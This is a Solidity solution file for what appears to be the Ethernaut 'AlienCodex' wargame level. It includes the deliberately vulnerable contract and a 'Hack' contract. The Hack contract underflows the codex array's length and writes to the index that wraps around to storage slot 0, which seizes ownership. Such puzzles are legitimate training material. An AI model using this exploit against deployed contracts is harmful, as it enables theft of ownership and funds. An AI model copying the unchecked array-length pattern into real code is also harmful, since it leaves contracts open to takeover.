// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../node_modules/hardhat-console/contracts/console.sol";

/**
You've uncovered an Alien contract. 
Claim ownership to complete the level.

  Things that might help

Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach

**/
contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

interface AlienCodexI  {
    function owner() external view returns(address);
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract Hack {

    AlienCodexI alien;

    constructor(address _add) public {
        alien = AlienCodexI(_add);
    }


    function owner() public view returns(address) {
        return alien.owner();
    }

    function getIndex() public pure returns(uint) {
        // EVM storage size is exactly 2**256-1 slots of 32 bytes.
        // +1 of that will lead to storage 0
        bytes32 one = keccak256(abi.encodePacked(uint(1)));  // 1 is storage slot start of array codex
        uint index = 2 ** 256 - 1 - uint(one) + 1;
        return index;
    }

    function hack() public {
        alien.make_contact();
        alien.retract();
        alien.revise(getIndex(), bytes32(uint(msg.sender)));
    }

   
}